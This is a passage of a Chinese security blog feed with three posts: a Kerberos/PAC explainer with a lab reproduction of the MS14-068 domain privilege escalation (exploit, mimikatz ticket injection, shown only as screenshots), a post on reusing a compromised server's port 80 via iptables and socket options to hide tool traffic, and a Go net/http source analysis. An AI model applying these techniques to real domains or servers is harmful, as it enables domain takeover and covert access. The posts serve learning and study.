        <content type="html"><![CDATA[<h1 id="MS14-068漏洞"><a href="#MS14-068漏洞" class="headerlink" title="MS14-068漏洞"></a>MS14-068漏洞</h1><p>  先从一个知名的漏洞开始吧：MS14-068</p><p>  这个漏洞在当时影响了全版本的Windows服务器，攻击者可以籍由这个漏洞实现权限提升，从普通域用户提升至域管理员身份。</p><p>  那在分析以及复现这个漏洞之前，先让我们来看看什么是Kerberos协议，这是所有这一切的核心所在</p><h2 id="Kerberos：地狱三头犬"><a href="#Kerberos：地狱三头犬" class="headerlink" title="Kerberos：地狱三头犬"></a>Kerberos：地狱三头犬</h2><p>  Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p><p>  假设一个场景，即有两者A和B，他们共同享有同样的一个secret，那么A在不安全的网络环境下如何向B证明其身份就成了一个问题</p><p>  最简单的方法就是A直接发送secret给B，让B来验证其真实性，但是在不安全的网络环境中，这段secret随时可能被恶意攻击者窃取，故而这一方法不可行</p><p>  那么要不A将secret作为密钥，用secret加密一段数据后，将密文和明文一起发给B，由B再进行校验？这样听起来可行，但是只要时间允许，攻击者是有可能对加密后的密文和明文之间进行破解来得到密钥的，故而也不可取</p><p>  那么Kerberos就是为了解决这个问题而产生的，它为这个过程带来了一个第三方机构KDC，每次的通讯都会由KDC来向A颁发一个临时的通讯密钥，保证每一次密钥都是不重复的，防止攻击者对其进行破解</p><p>  具体来说，KDC是由两部分组成的，AS和TGS，AS主要的职责是负责对申请者的认证，而TGS主要是向申请者颁发Service Ticket（后面会详细说）</p><p>  大概流程可以看下图：</p><p>  <img src="/image/Kerberos/snapshot.png" alt="auth"></p><p>  <strong>从图中可以看出，一开始A向AS认证的时候利用的是时间戳，这也引出了一点就是，Kerberos协议要求整个域内时间必须同步</strong></p><p>  详细流程大致如下：</p><p>  第①步：KRB_AS_REQ：Client-A发送Authenticator向KDC的AS服务认证自己的身份（通过提供自身密码加密的一个时间戳TimeStamp）</p><p>第②步：KRB_AS_REP：AS通过KDC数据库中存储的Client-A密码的副本，解密收到的Authenticator，如果解密出的TimeStamp符合要求，则AS服务认为Client-A就是所谓的Client-A。认证成功后，AS服务生成一个短期有效的SessionKeya-kdc，将该Key使用A的密码副本加密成密文1，另外将Key连同时间戳标志（控制该SessionKey的有效时间）通过TGS服务的密码也就是KDC的密码加密为密文2（称为TGT），将这两个密文组合成KRB_AS_REP返回给Client-A</p><p>第③步：KRB_TGS_REQ：Client-A在接收到KRB_AS_REP后，首先使用自身密码解密密文1得到SessionKeya-kdc，此时需要注意的是，密文2（TGT）是被KDC的密码加密的，所以Client-A无法解密，这也是Kerberos协议设计的精妙之处，既解决了Server端（TGS相对于Client-A也称之为Server端）无法及时接收SessionKey的问题，又不怕Client-A对该TGT的伪造，因为Client-A不知道Server端的密码</p><p>得到SessionKeya-kdc后，Client-A利用其加密时间戳生成Authenticator用于向TGS申请Client-A与Client-B进行认证所需的SessionKeya-b，连同刚才KRB_AS_REP接收的TGT一同组合成KRB_TGS_REQ发送给TGS</p><p>第④步：KRB_TGS_REP：TGS在接收到KRB_TGS_REP之后，利用KDC密码解密TGT获得本来就该发送给自己的SessionKeya-kdc，然后用其解密KRB_TGS_REQ中的Authenticator得到Client-A发送过来的时间戳，如果时间戳符合要求，则生成一个短期有效的SessionKeya-b，注意此时利用SessionKeya-kdc将SessionKeya-b加密为密文1，然后利用Server-B的密码将SessionKeya-b加密为密文2（称为ServiceTicket），两个密文一同构成KRB_TGS_REP返回给Client-A</p><p>第⑤步：KRB_AP_REQ：Client-A在接收到KRB_TGS_REP之后，首先使用缓存的SessionKeya-kdc将密文1中的SessionKeya-b解密出来，然后利用其加密时间戳生成Authenticator用于向B进行对自身的验证，另外，和刚才TGT一样，密文2也就是ServiceTicket是用Server-B的密码加密的，所以Client-A无法解密，也就无法伪造，这也同样解决了在三方认证中作为Server端的B无法及时接收SessionKey的问题，又不怕Client-A对ServiceTicket的伪造</p><p>第⑥步：KRB_AP_REP：Server-B受到KRB_AP_REQ之后，利用自身密码解密ServiceTicket，得到SessionKeya-b，然后用SessionKeya-b解密Authenticator得到时间戳，验证A的身份</p><p> 一个参考：</p><p> <a href="/archives/Kerberos/kerberos.html">详细过程</a>  </p><h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><p>  那么以上就是Kerberos协议的标准实现过程，但是在实际运行的windows服务器上，微软对标准Kerberos协议进行了扩充，其中最重要的扩充就是增加了权限认证，即PAC（Privilege Attribute Certificate），特权属性证书</p><p>  PAC的扩充主要旨在帮助B知道A是否有访问自身某些资源的权限，因为原本Kerberos并没有规定权限方面的问题</p><p>  那么在一个域中，如何才能知道某个域用户所拥有的权限呢？自然是需要提供User的SID和所在组Group的SID。必须了解的一个前提是，KDC、A和B三者中，B只信任KDC所提供的关于A到底是什么权限，所以在一个域初始时，KDC上拥有A和B的权限。现在需要解决的是，KDC必须告诉B关于A的权限，这样B验证A的权限后才能决定让不让A访问自身的网络资源。</p><p>  为了最终使得Server-B能知道Client-A所具有的权限，微软在KRB_AS_REP中的TGT中增加了Client-A的PAC（特权属性证书），也就是Client-A的权限，包括Client-A的User的SID、Group的SID：</p><p>  图片如下：</p><p>  <img src="/image/Kerberos/PAC.png" alt="image"></p><p>  可以看到被KDC加密的TGT中，不仅包括了被加密的SessionKeya-kdc，还包括KRB_AS_REQ中申请者（Client-A）的权限属性证书，为了防止该特权证书被篡改（即使被KDC加密，Client-A无法轻易解密，但谁也无法保证绝对的安全），在PAC的尾部增加了两个校验Server Signature和KDC Signature：</p><p>  这两个校验一个是Server Signature，另一个是KDC Signature，对于Client-A与AS服务来说，Server代表的是TGS服务，KDC代表的是AS服务（AS作为Client-A与TGS的第三方信任机构），而AS服务与TGS服务具有相同的krgtgt账号，所以这两个校验都是krgtgt账号的密码生成的，当然，整个TGT也是用KDC的密码也就是krgtgt账号密码加密的，它们三者不同的是，用的算法和加密内容有所不同。</p><p>  微软是这样打算的，无论如何也要把PAC从KDC传送到Server-B，为了在Kerberos认证过程中实现，微软选择了如下做法：</p><p>  将PAC放在TGT中加密后从AS服务经Client-A中转给TGS服务，再放在由TGS服务返回的ServiceTicket中加密后经Client-A中转给Server-B</p><p>  <img src="/image/Kerberos/ServiceTicket.png" alt="image"></p><p>  需要注意的是，在KRB_TGS_REQ阶段，携带PAC的TGT被TGS服务接收后，认证A的合法性后（解密Authenticator符合要求）会将PAC解密出来，验证尾部两个签名的合法性，如果合法则认为PAC没有被篡改，于是重新在PAC的尾部更换了另外两个签名，一个是Server Signature，这次是以Server-B的密码副本生成的签名（因为对于Client-A和Server-B，这次的第三方机构是TGS服务），另外一个仍旧是KDC Signature，两者合在一起，最终成为New Signed PAC被拷贝在ServericeTicket中被加密起来。</p><p><strong>注意，这里再次签发的PAC尾部的签名一个基于是B的密码hash一个仍然是基于KDC的密码hash（krgtgt用户的密码hash），在B端可以选择是否认证这个PAC的KDC签名，如果选择不认证，就不对PAC进行签名校验（也可能只校验基于B的密码hash的签名，这一点不太确定），并且之后也只是在解密PAC后直接根据用户权限来决定是否允许客户端访问相对应的资源，但是如果选择认证，B将会把PAC中的签名传递给DC来进行检验，只有DC确认签名有效后B才会根据用户权限来决定是否允许客户端访问相对应的资源，如下图所示,图片来自微软官方<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84">巨硬</a></strong></p><p> <img src="/image/Kerberos/Check_PAC.png" alt="check"></p><p><strong>当然，有的服务器并不校验KDC签名，校验与否决定了银票是否能够正常被使用（银票下一篇文章会讲）</strong></p><p>  最终绕过来绕过去，KDC上所拥有的关于Client-A的权限证书PAC终于发给了Server-B，Server-B在对Client-A进行认证的同时，同时也能判断Client-A有没有访问网络资源的权限。</p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>  这里我发现的一个大师傅分析的很不错，受教了</p><p>  <a href="/archives/Kerberos/MS14-068.html">详细</a></p><p>  可以继续好好消化</p><h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>  我自己在本地搭建了一下环境</p><p>  域控是win2008，域用户端是win7</p><p>  首先先看一下没有工具之前，我使用net use尝试挂载域控的c盘是无效的，需要输入用户名密码</p><p>  <img src="/image/Kerberos/init.jpg" alt="init"></p><p>  可以看到是无效的</p><p>  这是这个时候缓存的票据信息：</p><p>  <img src="/image/Kerberos/beforeinject.jpg" alt="before"></p><p>  此时，执行exploit</p><p>  <img src="/image/Kerberos/attack.jpg" alt="attack"></p><p>  将获得的TGT用mimikatz注入内存</p><p>  <img src="/image/Kerberos/inject.jpg" alt="inject"></p><p>  此时的缓存票据信息：</p><p>  <img src="/image/Kerberos/afterinject.jpg" alt="after"></p><p>  可以看见第一个票据被改变了（原来的第一个票据被移到第二个，看清标志），这就是我们的新TGT</p><p>  接着再尝试挂载域控的c盘：</p><p>  <img src="/image/Kerberos/barren.jpg" alt="nah"></p><p>  可以看见无效，这是因为，这时我们注入的是TGT，而我们实际上在登陆的时候就有了一张初始权限的ServiceTicket（可以看第三个票据，cifs/domain.test的那一个)，这是我们挂载时用到的ServiceTicket。也就是说其实系统会先检查内存中有没有相关服务的ServiceTicket，如果有就直接使用，如果没有，那么才会使用TGT去换ServiceTicket，故而这里我们虽然注入了高权限的TGT，系统却并没有用它来换ServiceTicket，而是用了之前的，故而还是无效的。</p><p>  这时我们清空票据缓存</p><p>  <img src="/image/Kerberos/purge.jpg" alt="purge"></p><p>  重新注入票据后：</p><p>  <img src="/image/Kerberos/inject_twice.jpg" alt="again"></p><p>  可以看见只有一张我们注入的TGT了</p><p>  重新尝试挂载：</p><p>  <img src="/image/Kerberos/success.jpg" alt="success"></p><p>  可以看见已经不需要用户名密码了</p><p>  再看看票据缓存：</p><p>  <img src="/image/Kerberos/final.jpg" alt="final"></p><p>  可以发现，系统使用我们注入的高权限TGT重新申请了高权限的ServiceTicket，从而完成了攻击，在票据到期前，攻击者拥有域内最高的权限</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  虽然是好几年前的漏洞了，但是对于理解Kerberos协议的工作原理还是有着很大的帮助</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口复用的一些tricks</title>
      <link href="Port-reuse.html"/>
      <url>Port-reuse.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了叙述方便，本文假设我们控制了一台主机，其80端口之上运行着apache服务，而我们需要复用80端口</p><h1 id="利用IPtables"><a href="#利用IPtables" class="headerlink" title="利用IPtables"></a>利用IPtables</h1><p>  首先第一种方法我是参考了网上的一篇<a href="/archives/Portreuse.htm">文章</a>，主要是利用IPtables规则来实现端口复用。</p><p>  实际上这个方法属于伪端口复用，因为实际上我们的程序并不会复用同样的端口，而是利用IPtables会在路由决策之前生效的特性，将我们的程序监听在本地的另一个端口上（比方说8888），将外部流量全部导向我们自己的程序，再由我们自己的程序进行流量的分发（通过识别流量特征区分工具流量和正常http流量）</p><p>  那么这个方法实际上确实效果还不错，不会影响到正常服务器的运行，而且在严格受限的环境当中（即只允许80端口的出入站连接），确实可以完成既定目标</p><p>  但是，这个方法的局限性也比较明显，那就是需要完成这个操作需要有root权限（废话。。。），并且仅支持linux服务器，而且会监听额外的端口。root权限虽然说不是每次都搞不到，但是也算是一个受限的点，毕竟我们无法保证能否在一些受限严格的边缘服务器上搞到root权限。</p><p>  总的来说，在有root权限的情况下，是个不错的方式。</p><h1 id="利用SO-REUSEADDR和SO-REUSEPORT"><a href="#利用SO-REUSEADDR和SO-REUSEPORT" class="headerlink" title="利用SO_REUSEADDR和SO_REUSEPORT"></a>利用SO_REUSEADDR和SO_REUSEPORT</h1><p>  其实这个方法也是由来已久，也是大家在设置socket的时候常常忽略的黑魔法。</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>  在windows上复用端口时，我们主要是利用了SO_REUSEADDR这个选项，这个选项一方面将允许两个进程监听相同端口，只需要ip地址不完全相同即可，打个比方，绝大多数web服务器默认监听在0.0.0.0上，所以我们的程序可以监听在192.168.x.x的ip上，并且监听同一个端口（因为通配符0.0.0.0和具体的ip地址192.168.x.x不是“同一个”ip地址），这样就可以劫持端口流量（因为在路由决策时，是最大匹配原则，当用户在外网访问服务器上的web页面时，会输入具体的ip地址192.168.x.x，这样的话在路由决策时，所有应当流向web服务器的流量将会被我们劫持，而我们只需要分发流量就可以成功完成复用）</p><p>  另一方面，在windows上SO_REUSEADD也同样具有SO_REUSEPORT（下面会讲到）的作用，也就是说只要在windows上设置了SO_REUSEADDR，同样也支持完全相同的ip：port对的监听。</p><p>  在windows上还有一个特性，也就是如果已经监听的进程是由管理员启动的，并且监听在了0.0.0.0：80上，那么此时设置了SO_REUSEADDR选项的，同样是由管理员启动的第二个进程，将可以实现127.0.0.1:80，0.0.0.0:80，192.168.x.x：80的复用，但如果第二个进程（设置了SO_REUSEADDR）是由普通用户设置的，那么将无法监听0.0.0.0:80，只能监听192.168.x.x：80 以及127.0.0.1:80.而如果反过来，第一个进程由普通用户启动，那么，不管第二个进程（设置了SO_REUSEADDR）是由管理员或者是普通用户启动，都可以实现0.0.0.0：80，127.0.0.1:80，192.168.x.x：80的监听</p><p>  值得一提的是，在windows上启动一个新的设置了SO_REUSEADDR选项的进程时是不会校验之前已经监听在相同端口上的程序是否同样启用了该选项的，只要新进程设置即可，但这也导致端口劫持的风险，所以微软在windows中又加入了一个特殊的选项SO_EXCLUCIVEADDRUSE，只要之前监听的程序设置此选项，那么之后再有进程想要监听同样的端口，将会被直接拒绝，防止端口劫持的发生</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>  在linux上，包含了SO_REUSEADDR以及SO_REUSEPORT两个选项。</p><p>  SO_REUSEADDR本身这个选项将允许两个进程监听相同端口，只需要ip地址不完全相同即可;但是在linux上有着特殊情况，此特殊情况导致了linux对于SO_REUSEADDR这个选项的实现和BSD及mac有很大区别，比如在linux上一个程序如果监听了通配符地址，那么就算后面的进程设置了SO_REUSEADDR，它也不能监听192.168.x.x或者127.0.0.1（在相同端口的情况下），反过来也一样（监听了127.0.0.1:80，就不能监听0.0.0.0:80，即通配符地址与所有地址互斥），而这在BSD及mac中这种情况是被允许的。</p><p>  讲一下SO_REUSEPORT，这个选项在在linux是可用的，在windows上并没有这个设置，它的出现是旨在进一步实现负<br>载均衡，可以让两个不同的进程同时监听在完全一致的ip：port组合上，从而实现端口复用</p><p>  一旦监听端口的前一个进程启用了SO_REUSEPORT，那么只要第二个启动的进程也启用SO_REUSEPORT选项，就可以实现完全相同的ip：port复用，此时发送到此端口的syn请求将被内核尝试平均分配，即两个进程将都会有机会获得外部的请求。</p><p>  但是，linux上的许多web程序或者其他功能程序默认情况下不会设置SO_REUSEPORT选项，故而很难用SO_REUSEADDR和SO_REUSEPORT来复用linux端口，需要另辟蹊径。</p><p>  PS：如果在启用了SO_REUSEPORT的情况下同时启用了SO_REUSEADDR（不确定SO_REUSEADDR是否需要启用，但是我们一般如果需要端口复用，都会将两者同时启用，在这边呢根据SO_REUSEADDR的功能描述，我更倾向与linux上将原本SO_REUSEADDR应该有的功能（使得通配符与特定地址监听不冲突）“锁住”了，只有当两个选项同时启用的时候，SO_REUSEADDR的原本功能才会“解锁”，重新恢复其原来应该具有的功能。所以我偏向于SO_REUSEADDR需要同时启用），那么SO_REUSEADDR将恢复原来应该有的功能，即哪怕前一个进程（同时启用了SO_REUSEADDR和SO_REUSEPORT）监听在0.0.0.0:80上，第二个进程（同样启用两个选项）也可以监听在192.168.x.x：80上，通配符地址不再与特定地址冲突。</p><p>  此外，在linux上还有一个限制，就是当前一个进程启用了SO_REUSEPORT时，第二个启动的进程必须与第一个启动的进程具有相同的用户id，不然哪怕第二个进程也启用了SO_REUSEPORT选项，同样无法复用端口。</p><h2 id="BSD及MAC"><a href="#BSD及MAC" class="headerlink" title="BSD及MAC"></a>BSD及MAC</h2><p>  由于MAC及BSD在此功能上的实现是一样的，故只拿mac举例了</p><p>  在mac上，与linux一样，包含了SO_REUSEADDR以及SO_REUSEPORT两个选项</p><p>  与linux的不同之处就在于，在单独启用SO_REUSEADDR选项时，通配符地址不与特定地址冲突，也就是说与linux上监听了0.0.0.0就不能监听192.168.x.x不同，只要两个进程都启用SO_REUSEADDR，这种监听就是可以成立的。</p><p>  而如果两个进程同时启用了SO_REUSEADDR以及SO_REUSEPORT，那么除了可以实现SO_REUSEADDR自身功能（允许两个进程监听相同端口，只需要ip地址不完全相同）以外，完全监听相同的ip：port选项也是被允许的</p><h2 id="数据包流向"><a href="#数据包流向" class="headerlink" title="数据包流向"></a>数据包流向</h2><p>  刚才说了那么多情况，有一个问题还没有解决，那就是如果两个功能完全不同的进程监听在完全相同的ip：port上，那么流量应当给谁呢？</p><p>  实际上这也要分情况讨论：</p><ul><li><p>在windows上，如果两个进程同时监听在完全相同的ip：port上，那么遵守先来先得的规则，外部请求只会被第一个监听在此ip：port的socket所接收，第二个socket将完全无法收到外部的请求</p></li><li><p>在linux上，同样情况下，由于linux内核对此的实现是尝试将外部请求平均分配，实现负载均衡，所以两个进程均有近似相同的几率可以获得来自外部的请求</p></li><li><p>在BSD/MAC上，需要分两种情况，当监听的ip地址为通配符地址时，与windows相同，遵守先来先得的规则，外部请求只会被第一个监听在此ip：port的socket所接收，第二个socket将无法接收外部的请求，而当监听的地址为特定地址时，遵守后来先得的规则，外部请求只会被第二个监听在此ip：port的socket所接收，第一个socket将无法接收外部的请求</p></li></ul><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  感觉在应用层上做端口复用效果不是很理想，要在内核层面上做才会有更好的效果</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go net/http包源码解析（一）</title>
      <link href="Go-source-code.html"/>
      <url>Go-source-code.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先来看看一个最常出错的地方，net/http包中，Response结构体Body的处理方法不当所导致的内存泄露问题</p><h1 id="为什么要Close？"><a href="#为什么要Close？" class="headerlink" title="为什么要Close？"></a>为什么要Close？</h1><p>  首先来看一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;io&#x2F;ioutil&quot;</span><br><span class="line">&quot;net&quot;</span><br><span class="line">&quot;net&#x2F;http&quot;</span><br><span class="line">&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func PrintLocalDial(network, addr string) (net.Conn, error) &#123;</span><br><span class="line">dial :&#x3D; net.Dialer&#123;</span><br><span class="line">Timeout:   30 * time.Second,</span><br><span class="line">KeepAlive: 30 * time.Second,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn, err :&#x3D; dial.Dial(network, addr)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return conn, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(&quot;connect done, use&quot;, conn.LocalAddr().String())</span><br><span class="line"></span><br><span class="line">return conn, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func doGet(client *http.Client, url string, id int) &#123;</span><br><span class="line">resp, err :&#x3D; client.Get(url)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; io.Copy(ioutil.Discard, resp.Body)</span><br><span class="line">&#x2F;&#x2F; fmt.Println(&quot;copy&quot;)</span><br><span class="line">buf, err :&#x3D; ioutil.ReadAll(resp.Body)</span><br><span class="line">fmt.Printf(&quot;%d: %s -- %v\n&quot;, id, string(buf[0:1]), err)</span><br><span class="line">if err :&#x3D; resp.Body.Close(); err &#x3D;&#x3D; nil &#123;</span><br><span class="line">fmt.Println(&quot;close&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">client :&#x3D; &amp;http.Client&#123;</span><br><span class="line">Transport: &amp;http.Transport&#123;</span><br><span class="line">Dial: PrintLocalDial,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">const URL &#x3D; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">for &#123;</span><br><span class="line">go doGet(client, URL, 1)</span><br><span class="line">go doGet(client, URL, 2)</span><br><span class="line">time.Sleep(2 * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这段代码是标准的写法，首先发出Get请求，然后读Body中的数据，最后将Body用Close方法关闭</p><p>  相信有不少人在首次编写类似程序的时候，一定有人告诉过你，一定要注意将Body关闭，不然会导致内存泄露的问题,那么，事实是否真的是这样呢？</p><p>  我们来看看源码（Go 1.13）</p><p>  首先我们来看看Do方法，只挑重点的代码段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) Do(req *Request) (*Response, error) &#123;</span><br><span class="line">return c.do(req)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  可以看到直接调用了私有方法do，再看看这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) do(req *Request) (retres *Response, reterr error) &#123;</span><br><span class="line">if testHookClientDoResult !&#x3D; nil &#123;</span><br><span class="line">defer func() &#123; testHookClientDoResult(retres, reterr) &#125;()</span><br><span class="line">&#125;</span><br><span class="line">if req.URL &#x3D;&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, &amp;url.Error&#123;</span><br><span class="line">Op:  urlErrorOp(req.Method),</span><br><span class="line">Err: errors.New(&quot;http: nil Request.URL&quot;),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">deadline      &#x3D; c.deadline()</span><br><span class="line">reqs          []*Request</span><br><span class="line">resp          *Response</span><br><span class="line">copyHeaders   &#x3D; c.makeHeadersCopier(req)</span><br><span class="line">reqBodyClosed &#x3D; false &#x2F;&#x2F; have we closed the current req.Body?</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Redirect behavior:</span><br><span class="line">redirectMethod string</span><br><span class="line">includeBody    bool</span><br><span class="line">)</span><br><span class="line">uerr :&#x3D; func(err error) error &#123;</span><br><span class="line">&#x2F;&#x2F; the body may have been closed already by c.send()</span><br><span class="line">if !reqBodyClosed &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">&#125;</span><br><span class="line">var urlStr string</span><br><span class="line">if resp !&#x3D; nil &amp;&amp; resp.Request !&#x3D; nil &#123;</span><br><span class="line">urlStr &#x3D; stripPassword(resp.Request.URL)</span><br><span class="line">&#125; else &#123;</span><br><span class="line">urlStr &#x3D; stripPassword(req.URL)</span><br><span class="line">&#125;</span><br><span class="line">return &amp;url.Error&#123;</span><br><span class="line">Op:  urlErrorOp(reqs[0].Method),</span><br><span class="line">URL: urlStr,</span><br><span class="line">Err: err,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for &#123;</span><br><span class="line">&#x2F;&#x2F; For all but the first request, create the next</span><br><span class="line">&#x2F;&#x2F; request hop and replace req.</span><br><span class="line">if len(reqs) &gt; 0 &#123;</span><br><span class="line">  &#x2F;&#x2F;省略了，不重要，看下面.......</span><br><span class="line">               &#125;</span><br><span class="line">&#x2F;&#x2F;重点</span><br><span class="line">reqs &#x3D; append(reqs, req)</span><br><span class="line">var err error</span><br><span class="line">var didTimeout func() bool</span><br><span class="line">&#x2F;&#x2F;重点是下面的send方法</span><br><span class="line">if resp, didTimeout, err &#x3D; c.send(req, deadline); err !&#x3D; nil &#123;</span><br><span class="line">&#x2F;&#x2F; c.send() always closes req.Body</span><br><span class="line">reqBodyClosed &#x3D; true</span><br><span class="line">if !deadline.IsZero() &amp;&amp; didTimeout() &#123;</span><br><span class="line">err &#x3D; &amp;httpError&#123;</span><br><span class="line">&#x2F;&#x2F; TODO: early in cycle: s&#x2F;Client.Timeout exceeded&#x2F;timeout or context cancellation&#x2F;</span><br><span class="line">      err:     err.Error() + &quot; (Client.Timeout exceeded while awaiting headers)&quot;,</span><br><span class="line">      timeout: true,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nil, uerr(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var shouldRedirect bool</span><br><span class="line">redirectMethod, shouldRedirect, includeBody &#x3D; redirectBehavior(req.Method, resp, reqs[0])</span><br><span class="line">if !shouldRedirect &#123;</span><br><span class="line">return resp, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req.closeBody()</span><br></pre></td></tr></table></figure><p>可以看到，在调用do方法时，首先会调用send方法，我们再来看看send方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; didTimeout is non-nil only if err !&#x3D; nil.</span><br><span class="line">func (c *Client) send(req *Request, deadline time.Time) (resp *Response, didTimeout func() bool, err error) &#123;</span><br><span class="line">if c.Jar !&#x3D; nil &#123;</span><br><span class="line">for _, cookie :&#x3D; range c.Jar.Cookies(req.URL) &#123;</span><br><span class="line">req.AddCookie(cookie)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;调用了send函数</span><br><span class="line">resp, didTimeout, err &#x3D; send(req, c.transport(), deadline)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, didTimeout, err</span><br><span class="line">&#125;</span><br><span class="line">if c.Jar !&#x3D; nil &#123;</span><br><span class="line">if rc :&#x3D; resp.Cookies(); len(rc) &gt; 0 &#123;</span><br><span class="line">c.Jar.SetCookies(req.URL, rc)</span><br><span class="line">&#125;</span><br><span 